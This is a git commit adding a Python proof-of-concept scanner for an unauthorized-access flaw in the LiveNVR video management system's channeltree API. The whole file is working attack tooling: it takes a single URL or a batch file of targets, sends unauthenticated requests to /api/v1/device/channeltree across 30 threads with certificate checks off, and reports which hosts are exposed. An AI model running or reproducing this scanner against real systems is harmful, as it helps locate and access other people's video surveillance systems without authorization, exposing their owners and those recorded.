bbdad1834f7e6b65d9402bc04a16465c36659fc4
zxj-hub <3180326527@qq.com>
2024-12-20 23:28:22 +0800

    未授权漏洞POC

---
+++ weishouquan1.py
@@ -0,0 +1,65 @@
+# livenvr青柿视频管理系统channeltree接口处存在未授权访问漏洞
+import requests
+import argparse
+
+requests.packages.urllib3.disable_warnings()
+from multiprocessing.dummy import Pool
+
+
+def main():
+    banner = """
+░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓██████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░    ░▒▓█▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░                                                                       
+
+    """
+    print(banner)
+    parse = argparse.ArgumentParser(description="livenvr青柿视频管理系统channeltree接口处存在未授权访问漏洞")
+    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
+    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
+    args = parse.parse_args()
+    url = args.url
+    file = args.file
+    targets = []
+
+    if args.url:
+        check(args.url)
+    elif file:
+        f = open(file, 'r')
+        for i in f.readlines():
+            i = i.strip()
+            if 'http' in i:
+                targets.append(i)
+            else:
+                i = f'http://{i}'
+                targets.append(i)
+
+    pool = Pool(30)
+    pool.map(check, targets)
+
+
+
+def check(target):
+    url = f'{target}/api/v1/device/channeltree?serial=&pcode'
+    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+              }
+
+
+    try:
+        response = requests.get(url=url, headers=header, verify=False, timeout=10)
+        if response.status_code == 200 and 'code' in response.text:
+            print(f'[+]{target}存在漏洞')
+        else:
+            print(f'[!]{target}不存在')
+    except Exception as e:
+        pass
+
+
+
+if __name__ == '__main__':
+    main()
